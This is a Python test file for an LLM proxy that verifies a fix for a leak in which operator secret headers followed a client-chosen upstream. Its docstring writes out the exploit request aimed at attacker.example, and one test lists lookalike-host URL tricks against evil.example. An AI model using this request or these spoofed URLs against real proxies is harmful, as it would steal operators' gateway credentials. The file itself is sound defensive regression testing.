"""The operator's own secrets must never follow a client-chosen upstream.

``x-headroom-base-url`` lets a client pick the upstream for a single request so
OpenAI-compatible gateways route through the dedicated handlers. That is a
feature and these tests do not remove it.

What they pin is the credential that used to ride along. ``*_extra_headers`` is
operator-configured and marked ``secret=True`` in the settings store — its own
help text uses an API key as the example. It was merged into the upstream-bound
headers *before* the destination was resolved, so:

    POST /v1/messages
    X-Headroom-Base-Url: https://attacker.example

reached the attacker's host carrying the operator's gateway key. One request, no
user interaction, from anything able to reach the proxy port.

The rule now is the one ``copilot_auth.is_copilot_upstream_url`` already applied
to Headroom's own Copilot token, generalized: a secret only travels to a host the
operator designated. Undesignated hosts still get proxied — just without the
secret.
"""

from __future__ import annotations

import httpx
import pytest

pytest.importorskip("fastapi")

from fastapi.testclient import TestClient  # noqa: E402

from headroom.proxy.helpers import merge_extra_headers  # noqa: E402
from headroom.proxy.server import ProxyConfig, create_app  # noqa: E402
from headroom.proxy.upstream_trust import (  # noqa: E402
    ALLOWED_HOSTS_ENV,
    is_trusted_upstream,
    reset_warning_state,
    url_host,
)

ATTACKER = "https://attacker.example"
GATEWAY_SECRET = {"Api-Key": "corp-gateway-secret"}


@pytest.fixture(autouse=True)
def _clear_warn_memo():
    reset_warning_state()
    yield
    reset_warning_state()


@pytest.fixture(autouse=True)
def _allow_reserved_test_upstreams(monkeypatch: pytest.MonkeyPatch) -> None:
    """Permit reserved test hosts while credential trust is tested separately."""
    monkeypatch.setenv("HEADROOM_ALLOWED_BASE_URLS", "attacker.example,corp-gw.internal")


class _Capturing(httpx.AsyncBaseTransport):
    def __init__(self) -> None:
        self.headers: dict[str, str] | None = None
        self.url: str | None = None

    async def handle_async_request(self, request: httpx.Request) -> httpx.Response:
        async for _ in request.stream:
            pass
        self.headers = {k.lower(): v for k, v in request.headers.items()}
        self.url = str(request.url)
        return httpx.Response(
            200,
            json={
                "id": "msg_1",
                "type": "message",
                "role": "assistant",
                "content": [{"type": "text", "text": "ok"}],
                "usage": {
                    "input_tokens": 10,
                    "output_tokens": 3,
                    "cache_read_input_tokens": 0,
                    "cache_creation_input_tokens": 0,
                },
            },
        )


def _app(**overrides) -> tuple[TestClient, _Capturing]:
    config = ProxyConfig(
        optimize=False,
        cache_enabled=False,
        rate_limit_enabled=False,
        cost_tracking_enabled=False,
        log_requests=False,
        ccr_inject_tool=False,
        ccr_handle_responses=False,
        ccr_context_tracking=False,
        image_optimize=False,
        anthropic_extra_headers=dict(GATEWAY_SECRET),
        **overrides,
    )
    app = create_app(config)
    transport = _Capturing()
    app.state.proxy.http_client = httpx.AsyncClient(transport=transport)
    return TestClient(app), transport


def _post(client: TestClient, base_url: str | None):
    headers = {"x-api-key": "client-key", "anthropic-version": "2023-06-01"}
    if base_url:
        headers["x-headroom-base-url"] = base_url
    return client.post(
        "/v1/messages",
        headers=headers,
        json={
            "model": "claude-sonnet-4-6",
            "max_tokens": 16,
            "messages": [{"role": "user", "content": "hi"}],
        },
    )


# --------------------------------------------------------------------------- #
# The reported vulnerability
# --------------------------------------------------------------------------- #
def test_operator_secret_does_not_follow_a_client_chosen_upstream() -> None:
    """The exploit: one header, and the gateway key went to the attacker."""
    client, transport = _app()

    resp = _post(client, ATTACKER)

    assert resp.status_code == 200, resp.text
    assert transport.headers is not None
    # The secret did NOT travel.
    assert "api-key" not in transport.headers
    assert GATEWAY_SECRET["Api-Key"] not in str(transport.headers)


def test_the_request_is_still_proxied_just_without_the_secret() -> None:
    """Failing closed on the credential, not on the request.

    Withholding the header is the fix; refusing to proxy would be a different
    (and breaking) product decision.
    """
    client, transport = _app()

    resp = _post(client, ATTACKER)

    assert resp.status_code == 200
    assert transport.url is not None and "attacker.example" in transport.url
    # The client's own credential is untouched — only the operator's is scoped.
    assert transport.headers is not None
    assert transport.headers.get("x-api-key") == "client-key"


# --------------------------------------------------------------------------- #
# What must keep working
# --------------------------------------------------------------------------- #
def test_secret_still_reaches_the_configured_target() -> None:
    """No override -> the ordinary path is completely unchanged."""
    client, transport = _app()

    resp = _post(client, None)

    assert resp.status_code == 200
    assert transport.headers is not None
    assert transport.headers.get("api-key") == GATEWAY_SECRET["Api-Key"]


def test_secret_reaches_an_override_that_matches_the_configured_target() -> None:
    """Pointing the override at the operator's own gateway is designated by definition."""
    client, transport = _app(anthropic_api_url="https://corp-gw.internal")

    resp = _post(client, "https://corp-gw.internal")

    assert resp.status_code == 200
    assert transport.headers is not None
    assert transport.headers.get("api-key") == GATEWAY_SECRET["Api-Key"]


def test_operator_can_designate_extra_hosts_via_env(monkeypatch) -> None:
    """The escape hatch the warning message tells operators about."""
    monkeypatch.setenv(ALLOWED_HOSTS_ENV, "attacker.example")
    client, transport = _app()

    resp = _post(client, ATTACKER)

    assert resp.status_code == 200
    assert transport.headers is not None
    assert transport.headers.get("api-key") == GATEWAY_SECRET["Api-Key"]


# --------------------------------------------------------------------------- #
# Host matching — the ways this class of check fails open
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "hostile",
    [
        # userinfo trick: everything before '@' is credentials, not the host
        "https://api.anthropic.com@evil.example/v1/messages",
        # missing label boundary
        "https://api.anthropic.com.evil.example/v1/messages",
        # substring, not a host
        "https://evil.example/?x=api.anthropic.com",
        "https://notapi.anthropic.com.evil.example",
    ],
)
def test_lookalike_hosts_are_not_trusted(hostile: str) -> None:
    assert is_trusted_upstream(hostile, None) is False


def test_base_url_and_base_plus_path_agree() -> None:
    """Compared by host, so adding a path cannot flip the verdict.

    A whole-string comparison would say True for the base and False for
    base+path, which is exactly how a gate ends up applying to routing but not
    to the credential attach.
    """
    for candidate in (
        "https://api.anthropic.com",
        "https://api.anthropic.com/",
        "https://api.anthropic.com/v1/messages?beta=true",
    ):
        assert is_trusted_upstream(candidate, None) is True


def test_scheme_less_host_is_still_parsed() -> None:
    """`urlparse` returns hostname=None without a scheme; that must not read as trusted."""
    assert url_host("api.anthropic.com/v1") == "api.anthropic.com"
    assert is_trusted_upstream("api.anthropic.com/v1", None) is True
    assert is_trusted_upstream("evil.example/v1", None) is False


def test_unparseable_destination_is_refused() -> None:
    assert is_trusted_upstream("://", None) is False


def test_no_override_means_trusted() -> None:
    """`None` is 'going to the configured target', not 'unknown'."""
    assert is_trusted_upstream(None, None) is True
    assert is_trusted_upstream("", None) is True


# --------------------------------------------------------------------------- #
# The helper contract
# --------------------------------------------------------------------------- #
def test_merge_requires_a_declared_destination() -> None:
    """`upstream_url` is keyword-only and required, so a new forwarder cannot
    merge a secret without saying where it goes."""
    with pytest.raises(TypeError):
        merge_extra_headers({"a": "b"}, {"x": "y"})  # type: ignore[call-arg]


def test_merge_without_extras_is_a_passthrough_regardless_of_destination() -> None:
    headers = {"a": "b"}
    assert merge_extra_headers(headers, None, upstream_url=ATTACKER) is headers
